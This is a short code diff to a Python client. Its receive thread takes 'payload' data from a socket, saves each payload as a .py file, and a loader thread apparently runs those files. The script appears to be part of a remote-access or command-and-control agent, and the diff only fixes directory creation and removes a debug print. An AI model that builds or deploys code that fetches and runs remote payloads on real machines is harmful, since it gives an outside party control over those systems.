@@ -143,8 +143,10 @@ class command():
 
 
 def recieve_cmds():
-    if os.getcwd()+DIR == None:
+    try:
         os.mkdir(os.getcwd()+DIR)
+    except FileExistsError:
+        pass
     while True:
         try:
             data = client.recv(4096)
@@ -152,7 +154,6 @@ def recieve_cmds():
             payload, args, typo, id = command_dispatch(data)
             filename = f"file{id}.py"
             filepath = os.path.join(os.getcwd()+DIR, filename)
-            print(filepath)
             with open(filepath, "w") as f:
                 f.write(payload)
             f.close()
@@ -188,7 +189,6 @@ def main():
     alive_thread.start()
 
     recieve_thread   = threading.Thread(target=recieve_cmds)
-    recieve_thread.daemon = True
     recieve_thread.start()
 
     loader_thread    = threading.Thread(target=do_cmds)
